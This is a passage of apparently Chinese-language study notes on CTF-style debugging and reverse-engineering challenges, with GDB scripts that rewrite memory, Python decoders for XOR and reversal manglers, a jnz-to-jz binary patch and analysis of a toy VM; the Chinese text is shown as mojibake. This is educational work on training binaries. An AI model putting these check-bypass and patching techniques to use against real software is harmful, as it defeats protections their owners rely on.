other!</p><p><strong>e.g.</strong> </p><figure class="highlight arduino"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs arduino"><span class="hljs-keyword">break</span> foo <span class="hljs-keyword">if</span> x&gt;<span class="hljs-number">0</span><br>commands<br>silent<br>printf <span class="hljs-string">&quot;x is %d\n&quot;</span>,x<br>cont<br>end<br></code></pre></div></td></tr></table></figure><p>å¥½å®¶ä¼™, æ¯æ¬¡åœ°å€éƒ½ä¼šå˜, å¾—æ¢æˆç›¸å¯¹åœ°å€. printf *($rbp-0x18)ç›´æ¥å¤±è´¥, æŠ¥attemp to dereferecing a generic pointer. è¦æƒ³dereferenceæŒ‡é’ˆå¾—ç¡®å®šæŒ‡é’ˆçš„ç±»å‹, </p><p>å…ˆè®¾æ–­ç‚¹ç„¶åå†c(ontinue).</p><figure class="highlight llvm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs llvm">r                           <br>b *main+<span class="hljs-number">709</span><br>commands<br>    silent<br>    <span class="hljs-keyword">x</span>/gx $rbp<span class="hljs-number">-0</span><span class="hljs-keyword">x</span><span class="hljs-number">18</span><br>    set *(int*)($rbp<span class="hljs-number">-0</span><span class="hljs-keyword">x</span><span class="hljs-number">1</span><span class="hljs-keyword">c</span>)<span class="hljs-operator">=</span><span class="hljs-number">7</span><br>    <span class="hljs-keyword">c</span><br><span class="hljs-keyword">end</span><br><span class="hljs-keyword">c</span><br></code></pre></div></td></tr></table></figure><p>çœŸæ­£è‡ªå·±å†™èµ·æ¥é—®é¢˜æ€ä¹ˆè¿™ä¹ˆå¤šâ€¦â€¦</p><h3 id="level6"><a href="#level6" class="headerlink" title="level6"></a>level6</h3><ul><li><p>å…¨è‡ªåŠ¨scrip. åœ¨æ‰‹å†Œä¸­çš„<code>23.1.3 Command Files</code>æœ‰ä»‹ç»ä¸€äº›flow control command. ç„¶å<code>5.1.3 Setting Catchpoints</code>ä¹ŸæŒºé‡è¦.</p></li><li><p>This time, try to write a script that doesnâ€™t require you to ever talk to the program, and instead automatically solves each challenge by correctly <strong>modifying registers / memory.</strong> </p></li><li><p><a href="https://www.mengyibai.com/p/gdb-print-variables/">GDB: Printing Variables to File</a>, ä¸å¤ªå¥½ç”¨, æ¯•ç«Ÿæ˜¯loggingæ–‡ä»¶.</p></li><li><p>ä½¿ç”¨<code>printf</code>å‘½ä»¤æ¥å†™raw bytesåˆ°æ–‡ä»¶ä¸­.</p></li><li><p><code>commands</code>å‘½ä»¤å¯ä»¥ä¸ºæ–­ç‚¹æ·»åŠ å‘½ä»¤.</p></li><li><p><code>ddb</code> â€“ interactive kernel debugger</p></li></ul><p>å¦‚æœè¦å…¨è‡ªåŠ¨, æˆ‘æƒ³åˆ°çš„æ€è·¯æ˜¯åœ¨read /dev/urandomçš„æ—¶å€™æ”¹æˆä»stdinè·å–, ç„¶åå†gdbä¸­ä½¿ç”¨<code>r &lt; tmp</code>æ¥é‡å®šå‘. åé¢çš„scanfä¹Ÿæ˜¯ä»stdinè·å–, è¿™æ ·çš„è¯å°±å¥½åŠäº†. ä¸ºäº†æµ‹è¯•conditionally perform gdb commands, å°±ä¸æ›´æ”¹å¾ªç¯å˜é‡äº†.</p><p>å†ç»æŒ«æŠ˜: </p><ul><li><del>æŠŠæ–‡ä»¶ä½œä¸ºè¾“å…¥è€Œä¸”è¦å¤šæ¬¡è¾“å…¥, æ¯æ¬¡æ–‡ä»¶æŒ‡é’ˆéƒ½ä¼šå‘åç§»åŠ¨çš„â€¦..æ‰€ä»¥è¿˜æ˜¯æ”¹å˜å†…å­˜å§â€¦â€¦</del>äº‹å®è¯æ˜æ²¡æœ‰é—®é¢˜, ä¸è¿‡å¦‚æœåªæ˜¯ç®€å•åœ°&gt;=3ä¼šå¯¼è‡´flagæ— æ³•æ‰“å¼€. æ‰€ä»¥åŠ ä¸Š<code>4&lt;tmp</code>, ifæ¡ä»¶æ¢æˆ<code>if $rdi &gt;= 3 &amp;&amp; $rdi != 0x44</code>å³å¯. </li><li>è¿™ä¸ªç¨‹åºæ¯æ¬¡éƒ½ä¼šé‡æ–°æ‰“å¼€/dev/uramdom, æˆ–è®¸æ˜¯å› ä¸ºæ–°çš„éšæœºæ•°è¦é‡æ–°æ‰“å¼€???è¿™æ ·æ–‡ä»¶æŒ‡é’ˆä¼šå¤§äºç­‰äº3â€¦â€¦</li><li>catch syscallä¼šåœ¨syscallä¹‹å‰å’Œä¹‹åè°ƒç”¨, æ‰€ä»¥è®¾ç½®å¥½ifè¯­å¥å°±è¡Œâ€¦. (calls to and returns from system calls will be caught.)</li><li>è¿˜æŠŠ==å†™æˆ=, ç»</li><li>è¿˜å‘ç°äº†ä¸€ä¸ª, ç¬¬å…­è¡ŒæŒ‰ç†æ¥è¯´å·²ç»è·³åˆ°åˆ«çš„å‡½æ•°äº†, æ¯•ç«Ÿreadä¹Ÿåªæ˜¯glibcçš„å°è£…, ä½†æ²¡æ³¨æ„åˆ°çš„æ˜¯<code>__GI___libc_read()</code>è¿™ä¸ªå‡½æ•°æ ¹æœ¬æ²¡æœ‰<code>push rbp</code>,  <strong>æ‰€ä»¥å½“å‰æ ˆå¸§æ²¡æœ‰å˜åŒ–</strong>.</li></ul><figure class="highlight shell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs shell">r &lt;tmp<br>catch syscall read<br>commands<br>    silent<br>    if($rdi &gt;= 3 &amp;&amp; $rdi != 0x44)<br>        set *(int64_t*)($rbp-0x18) = 0x010203 # set ptr type<br>    end<br>    c<br>end<br><br>b *main+630 # stop at scanf()<br>commands<br>    silent<br>    set *(int64_t*)($rbp-0x10) = 0x010203<br>    c<br>end<br>c<br></code></pre></div></td></tr></table></figure><p>ä¸€ä¸ªlevelèƒ½æŒ£è¿™ä¹ˆå¤šä¸œè¥¿å‡ºæ¥â€¦â€¦.</p><h3 id="level-7"><a href="#level-7" class="headerlink" title="level 7"></a>level 7</h3><p>ç›´æ¥ä¸€ä¸ª<code>call (void*)win()</code>å°±ç»“æŸäº†â€¦.</p><h1 id="module-7-rev"><a href="#module-7-rev" class="headerlink" title="module 7-rev"></a>module 7-rev</h1><ul><li>forword engineering vs. reverse engineering</li><li><code>cppÂ duÂ stripÂ strings</code> commands.</li><li>the most often we do is reversing the main modules.</li><li><code>fomit-frame-pointer</code> </li><li><a href="https://cloud.binary.ninja/u/yogdzewa">cloud ninja</a> ç”¨è¿™ä¸ªæˆ–è€…ç›´æ¥IDAå°±è¡Œ. éƒ½æœ‰IDA proäº†å…¶ä»–çš„å°±éšä¾¿è¯•è¯•.åæ­£è§†é¢‘é‡Œæ˜¯ä¸å¯èƒ½è¯´ç”¨ç›—ç‰ˆçš„:laughing: </li><li>æŠŠå¦ä¸€ä¸ªchecksecé“¾æ¥æˆäº†secheck, åŠŸèƒ½ä¼¼ä¹æ›´å¤šä¸€ç‚¹.</li><li>Open source:<ul><li><strong>angr management:</strong> an academic binary analysis framework! (<a href="https://github.com/angr/angr-management/releases">github</a>) </li><li><strong>ghidra:</strong> a reversing tool created by the National Security Agency (<a href="https://ghidra-sre.org/">https://ghidra-sre.org/</a>) </li><li><strong>cutter:</strong> a reversing tool created by the radare2 open source project (<a href="https://cutter.re/">https://cutter.re/</a>) </li></ul></li><li>dynamic analysis: <ul><li>ltrace and strace </li><li>gdb<ul><li>contextå¯ä»¥ç›´æ¥ç”¨displayå‘½ä»¤åœ¨æ¯æ¬¡åœä¸‹æ¥çš„æ—¶å€™æ¨¡æ‹Ÿ.</li></ul></li><li>Timeless Debugging<ul><li><strong>gdb</strong> has built-in record-replay functionality (<a href="https://sourceware.org/gdb/onlinedocs/gdb/Reverse-Execution.html#Reverse-Execution">doc</a>)</li><li><strong>rr</strong> is a highly-performant record-replay engine (<a href="https://github.com/mozilla/rr">github</a>) <a href="https://github.com/rr-debugger/rr/wiki/Usage">doc</a> </li><li><strong>qira</strong> is a timeless debugger made for reverse engineering (<a href="https://qira.me/">https://qira.me/</a>) </li></ul></li></ul></li></ul><h3 id="level1-0-2-1"><a href="#level1-0-2-1" class="headerlink" title="level1.0-2.1"></a>level1.0-2.1</h3><p>æ²¡æœ‰ä»€ä¹ˆç‰¹åˆ«, ä½†æ˜¯2.1è¿™ä¸ªå­—ç¬¦æ¢ä½ç½®çš„æ±‡ç¼–å€¼å¾—æ³¨æ„:</p><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm">movzx   eax, byte ptr [rbp+buf]<br>mov     byte ptr [rbp+var_10], al<br>movzx   eax, byte ptr [rbp+buf+1]<br>mov     byte ptr [rbp+var_10+1], al<br>movzx   eax, byte ptr [rbp+var_10+1]<br>mov     byte ptr [rbp+buf], al<br>movzx   eax, byte ptr [rbp+var_10]<br>mov     byte ptr [rbp+buf+1], al<br></code></pre></div></td></tr></table></figure><h3 id="level3"><a href="#level3" class="headerlink" title="level3"></a>level3</h3><p>åˆç€æ¯å…³è¿˜æœ‰æç¤ºè¿™å…³ç”¨äº†ä»€ä¹ˆâ€¦â€¦</p><p>level3æ˜¯reverse mangler.</p><h3 id="level4-1"><a href="#level4-1" class="headerlink" title="level4"></a>level4</h3><ul><li>IDAçš„æ±‡ç¼–è¯­æ³•æ˜¯ä½¿ç”¨çš„MASM(Microsoft Macro Assembler)çš„. <a href="https://docs.microsoft.com/en-us/cpp/assembler/masm/directives-reference?view=msvc-170">è¿™é‡Œ</a>æ˜¯ä¸€äº›directive. </li><li>IDAä½¿ç”¨çš„high-level ILæ˜¯IDC, ä¸€ä¸ªC-like language. åƒä»€ä¹ˆ<code>LOBYTE</code>åœ¨æ‰‹å†Œä¸­æœ‰</li><li>ä¸€ä¸ª<code>char buf[6]</code>è¢«è¯†åˆ«æˆäº†<code>int buf + int16_t v6</code>, æ”¹ä¸€ä¸‹bufçš„å®šä¹‰å°±æˆ.</li><li>çœ‹äº†çœ‹IDAçš„ä¸€äº›æ“ä½œ.</li></ul><p>ç”±äº<code>biltw</code>æ˜¯æŒ‰ç…§å­—æ¯é¡ºåºæ’åˆ—, æ‰€ä»¥ä¸€é€šæ“ä½œä¹‹åæ²¡æœ‰å˜åŒ–.</p><h3 id="level5-1"><a href="#level5-1" class="headerlink" title="level5"></a>level5</h3><blockquote><p>This challenge is now mangling your input using the <code>xor</code> mangler with key <code>0xb2</code> </p></blockquote><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-built_in">list</span> = [<span class="hljs-number">0xFA</span>,<span class="hljs-number">0xF6</span>,<span class="hljs-number">0xEA</span>,<span class="hljs-number">0xF5</span>,<span class="hljs-number">0xF1</span>]<br><span class="hljs-built_in">print</span>([<span class="hljs-built_in">chr</span>(x^<span class="hljs-number">0x98</span>) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>])<br><br>[<span class="hljs-string">&#x27;b&#x27;</span>, <span class="hljs-string">&#x27;n&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>, <span class="hljs-string">&#x27;m&#x27;</span>, <span class="hljs-string">&#x27;i&#x27;</span>]<br></code></pre></div></td></tr></table></figure><p>å¥½åƒç®€å•è¿‡å¤´äº†â€¦</p><h3 id="level6-1"><a href="#level6-1" class="headerlink" title="level6"></a>level6</h3><blockquote><p>reverse + sort + xor</p></blockquote><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;8f 8e 8e 8e 8c 82 81 87 86 84 9f 9e 9e 9e 93&quot;</span><br><span class="hljs-built_in">list</span> = <span class="hljs-built_in">str</span>.split(<span class="hljs-string">&quot; &quot;</span>)<br>list1 = [<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(x,<span class="hljs-number">16</span>)^<span class="hljs-number">0xeb</span>) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>]<br>list1.reverse()<br>res = <span class="hljs-string">&quot;&quot;</span>.join([x <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> list1])<br><span class="hljs-built_in">print</span>(res)<br></code></pre></div></td></tr></table></figure><p>å±äºæ˜¯pythonçš„ç»ƒä¹ ä½¿ç”¨</p><h3 id="level7"><a href="#level7" class="headerlink" title="level7"></a>level7</h3><blockquote><p>çœŸç‰¹ä¹ˆå¤æ‚â€¦.è¿˜æœ‰<strong>ä¸å¯è§å­—ç¬¦</strong>åªèƒ½æ•´æˆbyteå†™åˆ°æ–‡ä»¶é‡Œ.</p><p>å¥½åƒæŒºç®€å•, ä½†æ˜¯åˆæœ‰ç‚¹éš¾(?</p></blockquote><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-built_in">str</span> = <span class="hljs-string">&quot;ff ff fe fc fb fb fb f7 f6 f6 f1 e7 e6 e1 e1 3c 3a 3a 38 37 32 32 20 2c 25 22 21 32 20&quot;</span><br><span class="hljs-built_in">list</span> = <span class="hljs-built_in">str</span>.split(<span class="hljs-string">&quot; &quot;</span>)<br><span class="hljs-built_in">list</span>[<span class="hljs-number">22</span>], <span class="hljs-built_in">list</span>[<span class="hljs-number">27</span>] = <span class="hljs-built_in">list</span>[<span class="hljs-number">27</span>], <span class="hljs-built_in">list</span>[<span class="hljs-number">22</span>]<br><span class="hljs-built_in">list</span>.reverse()<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">list</span>)<br><span class="hljs-comment">#print(len(list))</span><br><span class="hljs-built_in">list</span> = [<span class="hljs-built_in">int</span>(x,<span class="hljs-number">16</span>) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-number">27</span>,<span class="hljs-number">2</span>):<br>    <span class="hljs-built_in">list</span>[i] ^= <span class="hljs-number">0x95</span><br>    <span class="hljs-built_in">list</span>[i+<span class="hljs-number">1</span>] ^= <span class="hljs-number">0x56</span><br><span class="hljs-built_in">list</span>[<span class="hljs-number">28</span>] ^= <span class="hljs-number">0x95</span> <span class="hljs-comment">#å¥‡æ•°ä¸ª.....</span><br><span class="hljs-built_in">list</span>.reverse()<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">list</span>)<br><br><br>byte = <span class="hljs-string">b&#x27;&#x27;</span>.join([x.to_bytes(<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;big&#x27;</span>) <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">list</span>]) <span class="hljs-comment">#ä»€ä¹ˆéœ€æ±‚ç›´æ¥è°·æ­Œæ¯”çœ‹æ–‡æ¡£å¿«å¤šäº†, ç‰¹åˆ«æ˜¯è¿™ç§ç®€å•è¯­æ³•......</span><br><span class="hljs-built_in">print</span>(byte)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;/root/Desktop/input&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> o:<br>    o.write(byte)                                                                              <br></code></pre></div></td></tr></table></figure><h3 id="level8"><a href="#level8" class="headerlink" title="level8"></a>level8</h3><p>è¿™åˆç†å—? å°±ç¡¬å †æ•°é‡â€¦â€¦</p><h3 id="level9"><a href="#level9" class="headerlink" title="level9"></a>level9</h3><blockquote><p>å™¢, æœ‰ç‚¹ä¸œè¥¿, å®Œå…¨çœ‹ä¸å‡ºæ¥å‘ç”Ÿäº†ä»€ä¹ˆ, å¾—åæ±‡ç¼–çœ‹çœ‹.</p><p>ç”¨çš„md5, æ²¡æœ‰åŠæ³•reverse, ä½†æ˜¯å¯ä»¥ä¿®æ”¹ä»£ç å†…å®¹. </p></blockquote><ul><li>IDA æ·»åŠ ç±»å‹ åœ¨shift+f1çš„local typesä¸­æ·»åŠ . ä¹Ÿå°±æ˜¯viewä¸­çš„open subviews. ctrl+1=quick view</li><li>gdb ä¸ set-uid ç¨‹åº ä¸ $base</li><li>IDA number of operand.</li></ul><p>å› ä¸ºä½¿ç”¨äº†<code>mprotect()</code>å¯ä»¥ä¿®æ”¹ä»£ç æ®µ, æ‰€ä»¥ç›´æ¥æ‰¾åˆ°jnzçš„åœ°æ–¹æ”¹æˆjz. ä¹Ÿå°±æ˜¯0x1f01å¤„ä»75æ”¹æˆ74.</p><h3 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h3><p>ä½¿ç”¨bin_peddingå‡½æ•°æŠŠmainå‡½æ•°å¡«å……åˆ°äº†2xxxçš„ç›¸å¯¹åœ°å€å¤„, ä¸è¿‡åŒä¸Š.</p><h3 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h3><blockquote><p>IDAçš„renameé€‰é¡¹åœ¨æ‰‹å†Œçš„Give Name to the Locationç« , æŸ¥äº†ä¸‹LOCAL and PUBLICä¼ªæŒ‡ä»¤</p><p>æˆ‘è¿˜å¾—æŸ¥ä¸‹md5å‡½æ•°æ€ä¹ˆç”¨.</p></blockquote><p>ç›´æ¥æŠŠæ•´ä¸ªç¨‹åºçš„æ¯ä¸ªéƒ¨åˆ†è¿›è¡Œä¸€ä¸ªhash, æ‰€ä»¥ä¿®æ”¹å…¶ä»–åœ°æ–¹æ— æ³•é€šè¿‡éªŒè¯. è€Œä¸”åªèƒ½ä¿®æ”¹2byte.</p><p>æ²¡äº‹äº†, è¿ç€æ”¹ä¸¤ä¸ªjnzå°±è¡Œäº†.</p><h3 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h3><blockquote><p>å¼€å§‹Yan85</p></blockquote><ul><li>LOAD segment åªæ˜¯ä¸ªæ²¡æœ‰åå­—çš„æ®µ, IDAé»˜è®¤æ•´ä¸ªåå­—ä¸Šå». å¯ä»¥åœ¨æ®µä»‹ç»ä¸­çœ‹åˆ°pure data/codeä¹‹ç±»çš„.</li><li>é€’å½’å­¦ä¹ :<ul><li>åœ¨IDAçœ‹åˆ°ä¸€ä¸ª<code>text &quot;UTF-16LE&quot;, &#39;abcdsif&#39;</code>, è¿˜ä»¥ä¸ºä¸ƒä¸ªå­—ç¬¦æ˜¯è¿åœ¨ä¸€èµ·çš„. ç»“æœå‘ç°UTF-16LEæœ‰ç‰¹åˆ«çš„åœ°æ–¹. ç›´æ¥æ”¹æˆDATAå°±ä¼šå‡ºç°\0é—´éš”çš„å­—ç¬¦.</li><li>ç„¶åå°±å»æŸ¥16LEæ˜¯ä»€ä¹ˆ. å…¶å®å°±æ˜¯UTF-16çš„little-endianç‰ˆæœ¬. Byte-Order-Mark etc.</li><li><strong>UTF-8ä¼˜åŠ¿åœ¨äºasciiæ˜¯1byte, 16ä¼˜åŠ¿åœ¨äºéasciiæ˜¯ä¸¤å­—èŠ‚, 32åœ¨äºä¸ç”¨encoding and decoding</strong>.</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs nasm"># memsetçš„ä¸€ç§å®ç°æ–¹æ³•, store string from rax by addr in rdi and counter in rcx.<br>leardxï¼Œ[rbp+var_110]<br>moveaxï¼Œ 0<br>movecxï¼Œ20h ;<br>mov rdi,rdx<br>rep stosq<br></code></pre></div></td></tr></table></figure><hr><p>Yan85: a1, a2, a3æ˜¯arg no.</p><ul><li><p>åœ¨mainå‡½æ•°ä¸­ä¸€ä¸ª256å­—èŠ‚çš„ç©ºé—´(char a1[256+7]), åé¢è·Ÿç€7byteç”¨ä½œä¸ƒä¸ªå¯„å­˜å™¨çš„ç©ºé—´. ç„¶åè¿›å…¥execute_program.</p></li><li><p>describe_registeræ˜¯å°†æ•°å­—è½¬æ¢æˆä¸€ä¸ªå­—ç¬¦, æ€»å…±æœ‰ä¸ƒä¸ª, æ¯ä¸ªå­—ç¬¦åé¢éƒ½æœ‰\0: <code>aNone           db &#39;NONE&#39;,0</code> </p></li><li><p>describe_* åé¢çš„levelå¯èƒ½ä¼šç”¨åˆ°, åˆ°æ—¶å†è¯´</p></li><li><p>write_registeræ˜¯å°†a2ç”¨ä½œa1[256~262]çš„ç´¢å¼•, ç„¶åå°†a3å†™å…¥æ•°ç»„ä¸­.</p><p><strong>å¯„å­˜å™¨ <code>r1 r2 r3 r4 r5 r6 r7</code></strong>  </p><p>**åˆ†åˆ«æ˜¯ <code>8Â  4Â  64 32 16 2Â  1Â </code> ** </p></li><li><p>write_memoryè¢«ç”¨åœ¨stmæŒ‡ä»¤ä¸­</p></li></ul><p>ç„¶ååˆ†æ<strong>æ¯ä¸ªæŒ‡ä»¤</strong>ä½œç”¨: (reg)è¡¨ç¤ºæ ‡å·å¯¹åº”çš„å¯„å­˜å™¨çš„å€¼.</p><ul><li>imm å°±æ˜¯     <code>(reg)a2 = a3</code> åŠ è½½ç«‹å³æ•°.</li><li>stmå…¶å®å°±æ˜¯<code>mov [(reg)a2 + a1], a3</code> </li><li>syscall(a1, a2, a3), å‡è®¾å¯„å­˜å™¨ä¸º<strong>r1 r2 ~ r6</strong>, ç„¶å<strong>if a2 == â€¦</strong> <ul><li>8: open <code>fd = open(&amp;a1[r1], r2, r3); (reg)a3Â =Â fd;</code> </li><li>4: read <code>v5 = r3+r2&gt;=256 ? -r2 : r3; count = read(r1, &amp;a1[r2], v5)</code> ç„¶åcountå†™å…¥reg a3</li><li>1: write <code>v5 = r3+r2&gt;=256 ? -r2 : r3; count = write(r1, &amp;a1[r2], v5)</code> ç„¶åcountå†™å…¥reg a3</li><li>16: sleep r1 secs, (reg)a3 = left_time</li><li>0x20: <code>exit(r1)</code> </li><li>else:  <code>exit( (reg)a3 )</code> </li></ul></li></ul><p>å¦‚æœæ˜¯12.1, ä¼°è®¡æˆ‘å†™ä¸ªgdbè„šæœ¬ä¼šæ›´æ–¹ä¾¿æˆ‘æŸ¥çœ‹æ‰§è¡Œæµç¨‹. åœ¨æ¯ä¸ªå‡½æ•°å…¥å£å¤„dumpargs, ç„¶åæ‰“å°å‡ºæ¥. 12.0æˆ‘å°±ç›´æ¥çœ‹çœ‹æç¤º.</p><p>woc, 12.1éƒ½æ²¡æœ‰å‡½æ•°åç§°çš„, æˆ‘è¿˜å¾—é‡å‘½åä¸€ä¸‹å‡½æ•°. </p><p>çœ‹äº†å‰é¢çš„ä¸€ç‚¹, åªè¦<code>printf &quot;\x94\x11\x3f\xb3&quot; &gt; input</code> å°±è¡Œ. è‡ªåŠ¨è¯»å–flag.</p><h3 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h3><blockquote><ul><li>ldm: load from memory: <code>(reg)a2 = a1[(reg)a3]</code> </li><li>cmp: ä¸¤ä¸ªå¯„å­˜å™¨ç»“æœæ”¾åœ¨a1[262]é‡Œ, ç¬¬äº”ä½ä½œä¸ºæ ‡å¿—ä½, <figure class="highlight ada"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs ada">å°äº : 16  ç¬¬5ä½<br>å¤§äº : 8ç¬¬4ä½<br>ç­‰äº : 4 ç¬¬3ä½<br>ä¸ç­‰äº: <span class="hljs-number">2</span>      ç¬¬<span class="hljs-number">2</span>ä½<br>ä¸¤ä¸ªå…¨ä¸ºé›¶:<span class="hljs-number">1</span>   ç¬¬<span class="hljs-number">1</span>ä½<br></code></pre></div></td></tr></table></figure></li><li><strong>å¯„å­˜å™¨ <code>r1 r2 r3 r4 r5 r6 r7</code></strong><br>**åˆ†åˆ«æ˜¯ <code>16 64 1Â  4Â  8Â  32 2Â </code> ** </li></ul></blockquote><p>çœ‹è§†é¢‘çœ‹åˆ°äº†æ–°æ–¹æ³•.</p><ul><li>é‡åˆ°äº†ä¸€ä¸ªæŒ‡ä»¤è§£æé”™è¯¯, åªèƒ½undefine<code>crash</code>å‡½æ•°, ç„¶åæŠŠå­—èŠ‚è®¾ç½®æˆæŒ‡ä»¤ è®¾ç½®å‡½æ•°end è®¾ç½®æ–°å‡½æ•°.</li><li>å®Œå…¨å¯ä»¥åªç”¨é™æ€åˆ†æ, æ—¢ç„¶256å­—èŠ‚ç©ºé—´ä¹‹åè·Ÿç€çš„æ˜¯7ä¸ªregister, é‚£ä¹ˆå¯ä»¥å®šä¹‰ä¸€ä¸ªç»“æ„ä½“, è¿™æ ·decompilerd resultä¼šæ›´å‡†ç¡®.</li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">state</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-keyword">char</span> memory[<span class="hljs-number">256</span>];<br>  <span class="hljs-keyword">unsigned</span> __int8 r1;<br>  <span class="hljs-keyword">unsigned</span> __int8 r2;<br>  <span class="hljs-keyword">unsigned</span> __int8 r3;<br>  <span class="hljs-keyword">unsigned</span> __int8 r4;<br>  <span class="hljs-keyword">unsigned</span> __int8 r5;<br>  <span class="hljs-keyword">unsigned</span> __int8 r6;<br>  <span class="hljs-keyword">unsigned</span> __int8 r7;<br>&#125;;<br></code></pre></div></td></tr></table></figure><ul><li>å¯¹äºdescribe_register()å‡½æ•°æ¥è¯´å¯ä»¥å®šä¹‰ä¸€ä¸ªenumå˜é‡, å°±ä¸ç”¨æé‚£ç¿»è¯‘æ¯ä¸ªå¯„å­˜å™¨æ˜¯å¯¹åº”å“ªä¸ªæ•°å­—äº†.</li></ul><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">REGISTER</span> :</span> __int8<br>&#123;<br>  r1 = <span class="hljs-number">0x1</span>,<br>  r3 = <span class="hljs-number">0x2</span>,<br>  r7 = <span class="hljs-number">0x4</span>,<br>  r4 = <span class="hljs-number">0x8</span>,<br>  r2 = <span class="hljs-number">0x10</span>,<br>  r6 = <span class="hljs-number">0x20</span>,<br>  r5 = <span class="hljs-number">0x40</span>,<br>&#125;;<br></code></pre></div></td></tr></table></figure><h3 id="level14-1"><a href="#level14-1" class="headerlink" title="level14.1"></a>level14.1</h3><blockquote><p>emmmmmå¥½åƒä¹Ÿæ²¡ä»€ä¹ˆæ„ä¹‰, çº¯ç²¹èŠ±æ—¶é—´çœ‹æ‡‚ä¸€ä¸ªæµç¨‹ç½¢äº†. åªæ˜¯å¤æ‚åº¦çš„ç®€å•å åŠ , æŠŠè¾“å…¥çš„æ¯ä¸ªbitè¿›è¡Œä¸€ä¸ªåŠ 